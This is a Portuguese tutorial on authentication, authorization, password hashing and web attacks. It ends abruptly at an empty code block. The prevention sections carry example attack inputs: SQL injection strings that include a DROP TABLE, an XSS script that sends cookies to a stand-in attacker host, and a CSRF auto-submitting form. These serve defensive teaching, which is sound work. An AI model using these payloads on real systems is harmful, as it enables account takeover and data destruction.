# Autenticação, Autorização e Segurança

## A Diferença Fundamental entre os Três Conceitos

Esses três termos são frequentemente usados como sinônimos, mas representam camadas distintas da proteção de um sistema:

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  AUTENTICAÇÃO → "Quem é você?"                             │
│  Verifica a identidade. Você é quem diz ser?               │
│  Ex: Login com email + senha, biometria, OTP               │
│                                                             │
│  AUTORIZAÇÃO  → "O que você pode fazer?"                   │
│  Verifica permissões. Você tem acesso a isso?              │
│  Ex: Admin pode deletar, usuário comum só pode ler         │
│                                                             │
│  SEGURANÇA    → "Como protegemos tudo isso?"               │
│  Conjunto de práticas e mecanismos que protegem os dados,  │
│  a infraestrutura e os usuários contra ameaças             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

> **Analogia:** Imagine um hospital.
> - **Autenticação** é a recepção verificando seu documento e crachá antes de entrar.
> - **Autorização** é o controle de quais andares e salas você pode acessar depois de entrar.
> - **Segurança** é o conjunto de câmeras, alarmes, políticas de acesso, treinamentos e auditorias que mantêm o hospital seguro.

A ordem importa: **você não pode autorizar quem não foi autenticado**. E de nada adianta autenticar e autorizar corretamente se o sistema é vulnerável a ataques que bypassam tudo isso.

---

## 1. Autenticação

### 1.1 Os Fatores de Autenticação

Autenticação se baseia em três categorias de evidência, chamadas de **fatores**:

| Fator | Conceito | Exemplos |
|---|---|---|
| **Algo que você sabe** | Conhecimento | Senha, PIN, resposta a pergunta secreta |
| **Algo que você tem** | Posse | Smartphone (TOTP), chave de segurança física (YubiKey), cartão |
| **Algo que você é** | Inerência | Impressão digital, Face ID, reconhecimento de íris |

**Por que um único fator não é suficiente em sistemas críticos:**

```
Senha (algo que sabe):
  → Pode ser roubada em vazamentos de banco de dados
  → Pode ser descoberta por força bruta
  → Pode ser obtida por phishing

Só smartphone (algo que tem):
  → Pode ser perdido ou roubado
  → SIM swap attack pode redirecionar SMS

Apenas biometria (algo que é):
  → Não pode ser revogada se comprometida (você não troca sua digital)
  → Falsos positivos em sistemas menos precisos
```

**Autenticação Multifator (MFA):** combina dois ou mais fatores diferentes. Se um fator for comprometido, o atacante ainda precisa dos outros:

```
Login seguro com MFA:

  1. Usuário digita email + senha     → fator 1: algo que sabe
         │
         ▼
  2. Sistema envia código TOTP        → fator 2: algo que tem
     para o app autenticador          (Google Authenticator, Authy)
         │
         ▼
  3. Usuário digita o código de 6 dígitos
         │
         ▼
  4. Acesso concedido
```

### 1.2 Como o TOTP Funciona (Google Authenticator)

O **TOTP (Time-based One-Time Password)** gera códigos de 6 dígitos que mudam a cada 30 segundos. A mágica é que o servidor e o app geram o mesmo código sem comunicação entre si:

```
Durante o setup (uma única vez):
  Servidor gera um segredo compartilhado (ex: BASE32: JBSWY3DPEHPK3PXP)
  Exibido como QR Code → app escaneia e armazena o segredo

A cada 30 segundos:
  App:      TOTP = HMAC-SHA1(segredo, timestamp_atual / 30)  → 6 dígitos
  Servidor: TOTP = HMAC-SHA1(segredo, timestamp_atual / 30)  → mesmos 6 dígitos

Os dois calculam o mesmo código independentemente
porque compartilham o segredo e usam o mesmo timestamp
```

Por isso o código expira: após 30 segundos, o timestamp muda e um novo código é gerado. Um atacante que captura um código tem no máximo 30 segundos para usá-lo.

---

## 2. Tokens de Autenticação

### 2.1 O Problema que os Tokens Resolvem

O protocolo HTTP é **stateless** — cada requisição é independente e o servidor não tem memória das anteriores. Sem algum mecanismo de estado, o usuário teria que enviar email e senha em **cada requisição**:

```
Sem tokens (impraticável):
  GET /meu-perfil    → "me manda email + senha"
  GET /meus-pedidos  → "me manda email + senha de novo"
  POST /novo-pedido  → "me manda email + senha de novo"
  ...

Com tokens:
  POST /login + {email, senha} → servidor verifica → emite token
  GET /meu-perfil + token      → servidor valida token → acesso
  GET /meus-pedidos + token    → servidor valida token → acesso
```

O token é uma **prova de identidade temporária** emitida após a autenticação bem-sucedida.

### 2.2 Dois Modelos: Stateful vs Stateless

```
MODELO STATEFUL (Session Token)
─────────────────────────────────
Cliente                  Servidor                   Banco/Redis
   │                        │                           │
   │── POST /login ─────────▶│                           │
   │                         │── salva sessão ──────────▶│
   │                         │   "sess_abc123": {        │
   │                         │     user_id: 42,          │
   │◀── Set-Cookie: ─────────│     roles: ["admin"]      │
   │    sess_abc123           │   }                       │
   │                         │                           │
   │── GET /dados ───────────▶│                           │
   │   Cookie: sess_abc123    │── busca sessão ──────────▶│
   │                         │◀─ retorna dados ──────────│
   │◀── 200 OK ──────────────│                           │


MODELO STATELESS (JWT)
─────────────────────────────────
Cliente                  Servidor
   │                        │
   │── POST /login ─────────▶│
   │                         │ gera JWT assinado com
   │◀── 200 + JWT ───────────│ a chave privada do servidor
   │                         │ (sem salvar nada!)
   │                         │
   │── GET /dados ───────────▶│
   │   Authorization: Bearer  │ valida assinatura do JWT
   │   eyJhbG...              │ localmente (sem banco)
   │◀── 200 OK ──────────────│
```

| Aspecto | Stateful (Session) | Stateless (JWT) |
|---|---|---|
| **Estado no servidor** | Sim (banco/Redis) | Não |
| **Revogação imediata** | Sim (delete a sessão) | Difícil (token válido até expirar) |
| **Escalabilidade** | Requer storage compartilhado | Qualquer servidor valida |
| **Tamanho** | Cookie pequeno (ID) | Token maior (carrega dados) |
| **Invalidação em logout** | Trivial | Requer blacklist ou tokens curtos |

### 2.3 JWT — Estrutura e Funcionamento

Um **JWT (JSON Web Token)** é uma string codificada em Base64 com três partes separadas por ponto:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiJ1c2VyOjQyIiwibmFtZSI6Ik1hcmlhIiwicm9sZXMiOlsiYWRtaW4iXSwiZXhwIjoxNzE2OTEyMDAwfQ
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│──────────────────────────────────────────────│
      HEADER          PAYLOAD          SIGNATURE
```

**Header** — metadados do token:
```json
{
  "alg": "RS256",   ← algoritmo de assinatura
  "typ": "JWT"
}
```

**Payload** — os dados (claims):
```json
{
  "sub": "user:42",            ← Subject: ID do usuário
  "name": "Maria",
  "roles": ["admin"],
  "iat": 1716825600,           ← Issued At: quando foi emitido
  "exp": 1716912000,           ← Expiration: quando expira
  "iss": "https://auth.meuapp.com",  ← Issuer: quem emitiu
  "aud": "https://api.meuapp.com"    ← Audience: para quem é
}
```

**Signature** — garante que o token não foi adulterado:
```
// Com RS256 (assimétrico — recomendado para produção):
SIGNATURE = RSA_Sign(
  Base64(header) + "." + Base64(payload),
  chave_privada_do_servidor
)

// Qualquer um pode verificar com a chave pública
// Só quem tem a chave privada pode gerar um token válido
```

> **Atenção crítica:** o payload do JWT é apenas **Base64 encoded, não criptografado**. Qualquer pessoa com o token pode ler o payload decodificando-o. Nunca coloque informações sensíveis (senhas, dados de cartão, dados pessoais protegidos por LGPD) no payload.

**Como a validação funciona na API:**

```
Requisição chega com:
  Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyOjQyIn0.SflKxw...
         │
         ▼
  API verifica a assinatura usando a chave pública
  (obtida em https://issuer/.well-known/jwks.json)
         │
         ├── Assinatura inválida?  → 401 (token adulterado ou forjado)
         ├── Token expirado?       → 401 (campo exp no passado)
         ├── Audience errado?      → 401 (token não é para esta API)
         └── Tudo OK               → extrai user_id, roles e processa
```

A validação é **local** — sem roundtrip ao servidor de autenticação a cada requisição. Isso é o que torna JWTs escaláveis.

### 2.4 Access Token e Refresh Token

Tokens de curta duração minimizam o dano se forem vazados, mas forçar o login a cada hora é inaceitável. A solução é o par Access Token + Refresh Token:

```
Access Token:
  Vida curta: 15 minutos a 1 hora
  Enviado em cada requisição à API
  Se vazado, o atacante tem acesso apenas por esse período

Refresh Token:
  Vida longa: dias ou semanas
  Guardado com segurança (HttpOnly cookie)
  Usado APENAS para obter um novo Access Token
  Nunca enviado à API diretamente
```

```
Fluxo completo:

  1. Login → servidor emite:
       Access Token  (expira em 1h)
       Refresh Token (expira em 30d, armazenado em banco)

  2. Cliente usa Access Token em cada requisição

  3. Access Token expira →
       Cliente envia Refresh Token para /token/refresh
       Servidor verifica Refresh Token no banco
       Emite novo Access Token

  4. Logout →
       Servidor deleta o Refresh Token do banco
       (o Access Token atual ainda é válido até expirar,
        por isso mantê-lo curto é importante)
```

### 2.5 Onde Armazenar Tokens no Frontend

Essa é uma das decisões de segurança mais importantes e mais erradas:

```
localStorage / sessionStorage:
  ✗ Acessível por qualquer JavaScript da página
  ✗ Vulnerável a ataques XSS — um script malicioso pode roubar o token
  ✗ Persiste após fechar a aba (localStorage)
  → Nunca use para tokens de autenticação

Cookie com HttpOnly + Secure + SameSite:
  ✓ HttpOnly: JavaScript NÃO consegue ler — imune a XSS
  ✓ Secure: só enviado em HTTPS
  ✓ SameSite=Strict: não enviado em requisições cross-site — protege de CSRF
  ✓ Opção mais segura para a maioria dos casos
```

```
Set-Cookie: refresh_token=eyJ...;
  HttpOnly;        ← JS não lê
  Secure;          ← apenas HTTPS
  SameSite=Strict; ← não vaza em cross-site
  Path=/auth;      ← enviado apenas para /auth/*
  Max-Age=2592000  ← 30 dias
```

---

## 3. Como as Senhas São Armazenadas

### 3.1 O Problema: Por Que Não Armazenar em Texto Puro?

A primeira intuição de um desenvolvedor iniciante é salvar a senha diretamente no banco:

```sql
INSERT INTO usuarios (email, senha) VALUES ('maria@email.com', 'minhasenha123');
```

**Por que isso é catastrófico:**

```
Cenário: banco de dados da empresa é vazado
(SQL injection, backup exposto, acesso indevido de funcionário)

Tabela vazada:
  email              | senha
  ─────────────────────────────
  maria@email.com    | minhasenha123
  joao@email.com     | qwerty2024
  admin@empresa.com  | Admin@2024!

Consequências imediatas:
  1. Senhas de todos os usuários estão expostas
  2. 60%+ das pessoas reutilizam senhas em outros sites
     → atacante testa essas senhas no Gmail, banco, etc.
  3. Empresa responde à LGPD/GDPR por negligência
  4. Reputação destruída
```

### 3.2 A Primeira Ideia: Hash Simples — Por Que Não Basta

Um hash é uma função matemática unidirecional: fácil de calcular, impossível de reverter.

```
MD5("minhasenha123") = "25f9e794323b453885f5181f1b624d0b"

  Propriedades:
  → Determinístico: mesma entrada sempre gera mesmo hash
  → Unidirecional: não dá pra voltar do hash para a senha
  → Tamanho fixo: qualquer senha vira string de mesmo tamanho

Armazenando hashes:
  email           | senha_hash
  ─────────────────────────────────────────────────
  maria@email.com | 25f9e794323b453885f5181f1b624d0b
```

**Verificação:** quando Maria faz login, você calcula `MD5(senha_digitada)` e compara com o hash armazenado. Se bateu, é a mesma senha.

**Problema 1 — Rainbow Tables:**

```
Um atacante pré-computa hashes de milhões de senhas comuns:
  
  Senha          → Hash MD5
  "password"     → 5f4dcc3b5aa765d61d8327deb882cf99
  "123456"       → e10adc3949ba59abbe56e057f20f883e
  "minhasenha123"→ 25f9e794323b453885f5181f1b624d0b  ← encontrou!

Banco vaza → atacante compara hashes → senhas descobertas em minutos
```

**Problema 2 — Hashes iguais para senhas iguais:**

```
  maria@email.com | 25f9e794323b453885f5181f1b624d0b
  pedro@email.com | 25f9e794323b453885f5181f1b624d0b  ← mesma senha!

Um atacante que descobre a senha de Maria
descobre automaticamente a senha de Pedro.
```

### 3.3 A Solução: Salt + Slow Hashing

**Salt** é um valor aleatório e único, gerado por usuário, adicionado à senha antes do hash:

```
Sem salt:
  hash("minhasenha123") = "25f9e794..."   ← sempre igual

Com salt (salt diferente por usuário):
  salt_maria = "xK9$mP2#"  (gerado aleatoriamente no cadastro)
  salt_joao  = "7qL@nR5!"  (diferente)

  hash("minhasenha123" + "xK9$mP2#") = "a8f3c92d..."  ← único para Maria
  hash("minhasenha123" + "7qL@nR5!") = "f4b1e87a..."  ← único para João

Mesmo que tenham a mesma senha, os hashes são completamente diferentes.
Rainbow tables não funcionam: precisariam computar uma tabela por salt.
```

O salt é armazenado junto com o hash (não é segredo — o segredo é a senha):

```sql
-- Coluna única que armazena salt + hash juntos
-- O bcrypt faz isso automaticamente no formato $2b$12$salt_base64$hash_base64
UPDATE usuarios SET senha_hash = '$2b$12$xK9mP2...hash...' WHERE id = 1;
```

**Slow hashing — velocidade intencional como defesa:**

Algoritmos como **MD5** e **SHA-256** foram projetados para serem rápidos — bilhões de operações por segundo em hardware moderno. Isso é ótimo para verificar integridade de arquivos, mas péssimo para senhas:

```
MD5 em GPU moderna: ~50 bilhões de hashes/segundo
  → Testam 50 bilhões de senhas por segundo
  → Senha de 8 caracteres (letras + números): crackada em minutos

BCrypt com cost factor 12: ~100 hashes/segundo por CPU
  → Testam 100 senhas por segundo
  → Senha de 8 caracteres: crackada em... séculos
```

O "custo" (work factor) do bcrypt é **deliberadamente alto e ajustável**. À medida que CPUs ficam mais rápidas, você aumenta o fator de custo para compensar.

### 3.4 Algoritmos Modernos para Hashing de Senhas

| Algoritmo | Usar? | Observação |
|---|---|---|
| **MD5** | ❌ Nunca | Rápido demais, sem salt nativo, quebrado por rainbow tables |
| **SHA-1 / SHA-256** | ❌ Nunca para senhas | Projetados para velocidade — errado para este caso |
| **BCrypt** | ✅ Boa escolha | Padrão há décadas, amplamente suportado, cost factor ajustável |
| **Argon2id** | ✅ Melhor escolha atual | Vencedor do Password Hashing Competition (2015), resistente a GPU e hardware especializado |
| **PBKDF2** | ✅ Aceitável | Recomendado pelo NIST, obrigatório em alguns contextos de compliance |

**Implementação com BCrypt (Node.js):**

```javascript
const bcrypt = require('bcrypt');

const SALT_ROUNDS = 12;  // custo: 2^12 iterações (~250ms por hash)

// Cadastro: hashear a senha antes de salvar
async function cadastrarUsuario(email, senhaPlana) {
  const senhaHash = await bcrypt.hash(senhaPlana, SALT_ROUNDS);
  // bcrypt gera e inclui o salt automaticamente no hash
  // resultado: "$2b$12$randomsalthere...hashhere"
  await db.query(
    'INSERT INTO usuarios (email, senha_hash) VALUES ($1, $2)',
    [email, senhaHash]
  );
}

// Login: verificar sem nunca "descriptografar"
async function login(email, senhaDigitada) {
  const usuario = await db.query(
    'SELECT senha_hash FROM usuarios WHERE email = $1',
    [email]
  );
  if (!usuario) throw new Error('Credenciais inválidas');

  // bcrypt compara internamente — você nunca vê a senha original
  const senhaCorreta = await bcrypt.compare(senhaDigitada, usuario.senha_hash);
  if (!senhaCorreta) throw new Error('Credenciais inválidas');

  return gerarToken(usuario);
}
```

**Implementação com Argon2id (Python):**

```python
from argon2 import PasswordHasher
from argon2.exceptions import VerifyMismatchError

ph = PasswordHasher(
    time_cost=3,       # número de iterações
    memory_cost=65536, # 64 MB de memória (dificulta ataques com ASIC/GPU)
    parallelism=2,     # threads paralelas
)

def cadastrar_usuario(email: str, senha_plana: str):
    senha_hash = ph.hash(senha_plana)
    # resultado: "$argon2id$v=19$m=65536,t=3,p=2$salt_base64$hash_base64"
    db.execute("INSERT INTO usuarios (email, senha_hash) VALUES (?, ?)",
               (email, senha_hash))

def login(email: str, senha_digitada: str):
    usuario = db.fetchone("SELECT senha_hash FROM usuarios WHERE email = ?", (email,))
    if not usuario:
        # Mesmo tempo de resposta para email inválido (evita user enumeration)
        ph.hash("dummy")
        raise ValueError("Credenciais inválidas")

    try:
        ph.verify(usuario["senha_hash"], senha_digitada)
    except VerifyMismatchError:
        raise ValueError("Credenciais inválidas")

    # Argon2 pode sugerir re-hash se os parâmetros de custo mudaram
    if ph.check_needs_rehash(usuario["senha_hash"]):
        novo_hash = ph.hash(senha_digitada)
        db.execute("UPDATE usuarios SET senha_hash = ? WHERE email = ?",
                   (novo_hash, email))
```

> **Detalhe importante de segurança:** retorne sempre `"Credenciais inválidas"` tanto para email inexistente quanto para senha errada — nunca `"Email não encontrado"`. Mensagens diferentes permitem **user enumeration**: um atacante descobre quais emails existem no sistema testando variações.

---

## 4. Autorização

### 4.1 RBAC — Role-Based Access Control

O modelo mais comum: permissões são atribuídas a **roles (papéis)**, e usuários recebem roles.

```
RBAC:

  Usuário → tem Roles → que têm Permissões

  Roles do sistema:
  ┌─────────────┬─────────────────────────────────────────────┐
  │ admin       │ read:users write:users delete:users          │
  │             │ read:products write:products delete:products │
  ├─────────────┼─────────────────────────────────────────────┤
  │ editor      │ read:products write:products                 │
  ├─────────────┼─────────────────────────────────────────────┤
  │ viewer      │ read:products                                │
  └─────────────┴─────────────────────────────────────────────┘

  Maria tem role "admin"  → pode tudo
  João tem role "editor"  → pode ler e editar produtos
  Pedro tem role "viewer" → só pode ler
```

**Implementação de middleware de autorização (Express.js):**

```javascript
function verificarPermissao(permissaoNecessaria) {
  return (req, res, next) => {
    const permissoesDoUsuario = req.user.permissions;  // extraídas do JWT

    if (!permissoesDoUsuario.includes(permissaoNecessaria)) {
      return res.status(403).json({
        error: 'Acesso negado',
        detalhe: `Permissão necessária: ${permissaoNecessaria}`
      });
    }

    next();
  };
}

// Uso nas rotas:
router.get('/usuarios', autenticar, verificarPermissao('read:users'), listarUsuarios);
router.delete('/usuarios/:id', autenticar, verificarPermissao('delete:users'), deletarUsuario);
```

### 4.2 ABAC — Attribute-Based Access Control

RBAC é simples, mas não consegue expressar regras como "usuário só acessa seus próprios dados". ABAC resolve isso usando atributos do usuário, do recurso e do contexto:

```
Política ABAC (exemplo em pseudocódigo):

  PERMITIR se:
    usuario.departamento == recurso.departamento
    AND usuario.nivel_acesso >= recurso.nivel_minimo
    AND contexto.hora_atual BETWEEN 08:00 AND 18:00
    AND contexto.ip IN lista_ips_corporativos

Exemplos de regras comuns:
  "Usuário só pode editar posts que ele mesmo criou"
    → post.criado_por == usuario.id

  "Gerente só acessa dados da sua equipe"
    → funcionario.gerente_id == usuario.id

  "Documentos confidenciais só no horário comercial"
    → documento.classificacao == "confidencial"
       AND contexto.horario IN horario_comercial
```

**Implementação prática (Python/FastAPI):**

```python
def verificar_acesso_ao_pedido(usuario: Usuario, pedido: Pedido):
    # Admin pode ver qualquer pedido
    if "admin" in usuario.roles:
        return True

    # Usuário comum só vê seus próprios pedidos
    if pedido.cliente_id == usuario.id:
        return True

    # Suporte pode ver pedidos dos seus clientes atribuídos
    if "suporte" in usuario.roles and pedido.cliente_id in usuario.clientes_atribuidos:
        return True

    return False

@router.get("/pedidos/{pedido_id}")
async def buscar_pedido(pedido_id: int, usuario = Depends(get_usuario_atual)):
    pedido = await db.get_pedido(pedido_id)
    if not pedido:
        raise HTTPException(404)

    if not verificar_acesso_ao_pedido(usuario, pedido):
        raise HTTPException(403, "Acesso negado")

    return pedido
```

### 4.3 Princípio do Menor Privilégio

Uma das regras de ouro da segurança: **conceda apenas as permissões estritamente necessárias para a função**.

```
✗ Ruim:
  Serviço de relatórios tem acesso de escrita ao banco de usuários
  → Se o serviço for comprometido, atacante pode modificar dados

✓ Bom:
  Serviço de relatórios tem apenas SELECT em tabelas específicas
  → Se comprometido, atacante só lê — não modifica

✗ Ruim:
  Token de API do parceiro tem permissão admin
  → Uma chave vazada expõe tudo

✓ Bom:
  Token do parceiro tem só read:products e write:orders
  → Escopo mínimo para a integração funcionar
```

---

## 5. Os Principais Ataques e Como Prevenir

### 5.1 SQL Injection

**O ataque mais clássico e ainda presente.** Acontece quando dados do usuário são concatenados diretamente em queries SQL:

```python
# ✗ VULNERÁVEL — nunca faça isso
email = request.form["email"]  # usuário digita: ' OR '1'='1
query = f"SELECT * FROM usuarios WHERE email = '{email}'"
# Query resultante:
# SELECT * FROM usuarios WHERE email = '' OR '1'='1'
# → Retorna TODOS os usuários!

# Pior ainda — com input: '; DROP TABLE usuarios; --
# SELECT * FROM usuarios WHERE email = ''; DROP TABLE usuarios; --'
# → Deleta a tabela inteira
```

**Como prevenir — Prepared Statements / Parameterized Queries:**

```python
# ✓ SEGURO — o driver separa query e dados
cursor.execute(
    "SELECT * FROM usuarios WHERE email = %s",
    (email,)  # ← o driver escapa os dados automaticamente
)

# O banco recebe a query e os parâmetros separadamente
# Não há como o dado "virar" parte da query
```

```javascript
// Node.js com pg (PostgreSQL):
const result = await pool.query(
  'SELECT * FROM usuarios WHERE email = $1',
  [email]  // ← parâmetro separado, nunca concatenado
);
```

**Com ORM (SQLAlchemy, Prisma, Sequelize):** ORMs usam prepared statements por padrão. Mas cuidado com queries raw — o mesmo risco existe:

```python
# ✗ Ainda vulnerável, mesmo com SQLAlchemy
db.execute(f"SELECT * FROM usuarios WHERE email = '{email}'")

# ✓ Seguro com SQLAlchemy
db.execute(text("SELECT * FROM usuarios WHERE email = :email"), {"email": email})

# ✓ Ainda melhor — usar ORM diretamente
db.query(Usuario).filter(Usuario.email == email).first()
```

### 5.2 XSS — Cross-Site Scripting

**O ataque:** injetar código JavaScript malicioso em uma página que outros usuários irão visualizar.

```
Cenário: campo de comentário em um blog

Usuário malicioso envia:
  <script>
    fetch('https://atacante.com/steal?cookie=' + document.cookie)
  </script>

Se o sistema renderiza esse HTML sem sanitização:
  → Quando outro usuário abre o post, o script executa
  → O cookie de sessão é enviado para o atacante
  → Atacante tem acesso à conta da vítima (session hijacking)
```

**Tipos de XSS:**

```
Reflected XSS:
  URL: https://site.com/busca?q=<script>alert(1)</script>
  O parâmetro é "refletido" diretamente na resposta HTML
  Requer que a vítima clique em um link malicioso

Stored XSS (persistente — mais perigoso):
  Dado malicioso salvo no banco (comentário, perfil, etc.)
  Executado para todos que visualizarem aquele conteúdo

DOM-based XSS:
  JavaScript da própria página usa dados de fontes não confiáveis
  (URL hash, postMessage) sem sanitizar
```

**Como prevenir:**

```javascript
// ✗ Perigoso — renderiza HTML diretamente
element.innerHTML = userInput;
document.write(userInput);

// ✓ Seguro — renderiza como texto, nunca como HTML
element.textContent = userInput;
element.innerText = userInput;

// Em templates (React, Vue) — JSX/templates escapam por padrão:
// React: {userInput} → seguro
// React: dangerouslySetInnerHTML={{ __html: userInput }} → ✗ perigoso

// Se precisar renderizar HTML do usuário, use uma biblioteca de sanitização:
const DOMPurify = require('dompurify');
element.innerHTML = DOMPurify.sanitize(userInput);
```

**Content Security Policy (CSP):** header HTTP que restringe de onde scripts podem ser carregados:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.meusite.com

→ Qualquer script de origem desconhecida é bloqueado pelo browser
→ Mesmo que XSS seja injetado, não consegue executar scripts externos
```

### 5.3 CSRF — Cross-Site Request Forgery

**O ataque:** enganar o browser de um usuário autenticado para fazer requisições não autorizadas.

```
Cenário: usuário está logado no banco.com

Atacante cria uma página maliciosa com:
  <form action="https://banco.com/transferir" method="POST">
    <input name="valor" value="5000">
    <input name="destino" value="conta_atacante">
  </form>
  <script>document.forms[0].submit()</script>

Usuário acessa malicioso.com enquanto está logado no banco:
  → Browser envia automaticamente os cookies do banco.com
  → Banco recebe requisição autenticada e transfere o dinheiro
  → Usuário não percebeu nada
```

**Como prevenir:**

**1. CSRF Tokens (método clássico):**
```
Servidor gera token único por sessão → inclui no formulário como campo oculto
Servidor valida o token ao receber o POST
Atacante não consegue incluir o token correto (não tem acesso à página)

<form>
  <input type="hidden" name="csrf_token" value="a8f3c92d...">
  ...
</form>
```

**2. SameSite Cookie (proteção moderna e simples):**
```
Set-Cookie: session=abc123; SameSite=Strict

SameSite=Strict: cookie NÃO é enviado em requests cross-site
→ O formulário malicioso não consegue usar o cookie da vítima
→ Proteção efetiva contra CSRF sem necessidade de tokens
```

**3. Verificar o header Origin/Referer:**
```python
@app.middleware("http")
async def verificar_origem(request: Request, call_next):
    if request.method in ["POST", "PUT", "DELETE"]:
        origin = request.headers.get("origin")
        if origin and origin not in ORIGENS_PERMITIDAS:
            return JSONResponse({"error": "Origem não permitida"}, status_code=403)
    return await call_next(request)
```

### 5.4 Brute Force e Rate Limiting

**O ataque:** testar sistematicamente senhas ou tokens até acertar.

```
Sem proteção — atacante pode testar:
  admin@empresa.com + "password"    → falha
  admin@empresa.com + "Password1"   → falha
  admin@empresa.com + "Admin2024"   → SUCESSO (encontrou em 3 tentativas)

Com lista de 10 milhões de senhas comuns vazadas:
  GPU moderna + MD5: 50 bilhões/s → todas testadas em millisegundos
```

**Como prevenir — camadas de proteção:**

```python
from fastapi import HTTPException
import redis.asyncio as redis

MAX_TENTATIVAS = 5
BLOQUEIO_SEGUNDOS = 900  # 15 minutos

async def verificar_rate_limit_login(email: str, ip: str):
    r = redis.Redis.from_url(REDIS_URL)

    # Bloqueia por email (evita ataques direcionados)
    chave_email = f"login_fail:email:{email}"
    tentativas_email = await r.incr(chave_email)
    await r.expire(chave_email, BLOQUEIO_SEGUNDOS)

    # Bloqueia por IP (evita ataques distribuídos por email)
    chave_ip = f"login_fail:ip:{ip}"
    tentativas_ip = await r.incr(chave_ip)
    await r.expire(chave_ip, BLOQUEIO_SEGUNDOS)

    if tentativas_email > MAX_TENTATIVAS or tentativas_ip > MAX_TENTATIVAS * 3:
        raise HTTPException(
            status_code=429,
            detail="Muitas tentativas de login. Tente novamente em 15 minutos.",
            headers={"Retry-After": str(BLOQUEIO_SEGUNDOS)}
        )

async def login(email: str, senha: str, request: Request):
    await verificar_rate_limit_login(email, request.client.host)

    usuario = await buscar_usuario(email)
    if not usuario or not verificar_senha(senha, usuario.senha_hash):
        raise HTTPException(401, "Credenciais inválidas")

    # Sucesso — reseta os contadores
    r = redis.Redis.from_url(REDIS_URL)
    await r.delete(f"login_fail:email:{email}")
    return gerar_tokens(usuario)
```

**Outras camadas complementares:**
- **CAPTCHA:** após N tentativas falhas, exige resolução de desafio visual
- **Account lockout com notificação:** após X tentativas, bloqueia e notifica o usuário por email
- **Delay progressivo:** 1s, 2s, 4s, 8s entre tentativas (exponential backoff)
- **MFA:** mesmo que a senha seja descoberta, o segundo fator bloqueia o acesso

### 5.5 Insecure Direct Object Reference (IDOR)

Um dos erros mais comuns e mais explorados. Acontece quando um identificador de recurso (ID) é exposto e o servidor não verifica se o usuário tem acesso a ele:

```
Usuário Maria acessa seus pedidos:
  GET /api/pedidos/1042  → retorna pedido de Maria ✓

Maria muda o ID na URL:
  GET /api/pedidos/1043  → retorna pedido de João ✗ (deveria ser 403)
  GET /api/pedidos/1    → retorna pedido do usuário "1" (talvez admin) ✗

Se o servidor retorna o recurso sem verificar o dono:
  → Maria vê os pedidos de qualquer outro usuário
```

**Prevenção — sempre verificar posse:**

```python
@router.get("/pedidos/{pedido_id}")
async def buscar_pedido(pedido_id: int, usuario_atual = Depends(auth)):
    pedido = await db.get_pedido(pedido_id)

    if not pedido:
        raise HTTPException(404)

    # ← ESTA VERIFICAÇÃO É OBRIGATÓRIA
    if pedido.cliente_id != usuario_atual.id and "admin" not in usuario_atual.roles:
        raise HTTPException(403, "Acesso negado")
        # Nota: alguns recomendam retornar 404 aqui para não revelar
        # que o recurso existe (security through obscurity)

    return pedido
```

---

## 6. HTTPS e TLS — Segurança na Camada de Transporte

### 6.1 Por que HTTPS é Obrigatório

HTTP trafega dados em texto puro pela rede. Qualquer roteador, ISP ou atacante no meio do caminho pode ler e modificar o que passa:

```
HTTP (sem criptografia):
  Seu browser → roteador do café → ISP → servidor

  Roteador do café pode ver:
  POST /login
  Body: email=maria@email.com&senha=minhasenha123  ← texto puro!

HTTPS (com TLS):
  Seu browser → roteador do café → ISP → servidor

  Roteador do café vê apenas:
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ← criptografado
```

### 6.2 Como o TLS Funciona (TLS Handshake)

```
Cliente                              Servidor
   │                                    │
   │── ClientHello ───────────────────→ │
   │   (versão TLS, algoritmos suportados)
   │                                    │
   │ ← ServerHello ─────────────────── │
   │   (algoritmo escolhido +          │
   │    certificado digital)           │
   │                                    │
   │   [Cliente verifica o certificado] │
   │   É assinado por uma CA confiável? │
   │   O domínio bate com o certificado?│
   │                                    │
   │── Key Exchange ─────────────────→ │
   │   (troca de chaves usando         │
   │    criptografia assimétrica       │
   │    para estabelecer chave simétrica)
   │                                    │
   ├──────────── Handshake completo ────┤
   │                                    │
   │ ←──── Dados criptografados ──────→ │
   │   (usando chave simétrica AES     │
   │    estabelecida no handshake)     │
```

**Por que dois tipos de criptografia?**
- **Assimétrica (RSA/ECDHE):** segura mas lenta — usada apenas no handshake para trocar a chave simétrica
- **Simétrica (AES):** rápida — usada para criptografar todos os dados da sessão

### 6.3 Certificados e Certificate Authorities

Um certificado TLS prova que você está realmente falando com `banco.com` e não com um impostor:

```
Certificado de banco.com contém:
  - Domínio: banco.com
  - Chave pública do servidor
  - Assinado por: Let's Encrypt (CA confiável)
  - Válido até: 2024-12-31

Seu browser confia em Let's Encrypt (tem a CA na lista de confiáveis).
Let's Encrypt verificou que banco.com realmente controla o domínio.
Logo, o certificado prova que você está no servidor real do banco.com.
```

**Let's Encrypt** oferece certificados gratuitos e automatizados — não existe desculpa para usar HTTP em produção.

### 6.4 HSTS — HTTP Strict Transport Security

Mesmo com HTTPS disponível, um atacante pode interceptar a primeira requisição HTTP (antes do redirect para HTTPS) em um ataque **SSL stripping**:

```
Sem HSTS:
  1. Usuário digita "banco.com" (sem https://)
  2. Browser faz HTTP GET banco.com
  3. Atacante intercepta, remove o redirect para HTTPS
  4. Usuário fica em HTTP sem perceber

Com HSTS:
  Strict-Transport-Security: max-age=31536000; includeSubDomains

  Browser armazena: "banco.com SEMPRE deve usar HTTPS"
  Próximo acesso: browser vai direto para HTTPS sem requisição HTTP
  Atacante não tem chance de interceptar
```

---

## 7. Armazenamento Seguro de Segredos

Senhas de banco, chaves de API, certificados — tudo isso são **segredos** que precisam de proteção especial.

### O Que Não Fazer

```python
# ✗ Hardcoded no código (vai para o git!)
DATABASE_URL = "postgresql://admin:senha_secreta@prod.db:5432/app"
STRIPE_KEY = "sk_live_abc123..."

# ✗ Em arquivo .env commitado
# (sim, arquivos .env aparecem em repositórios públicos)
```

### Como Fazer Corretamente

```bash
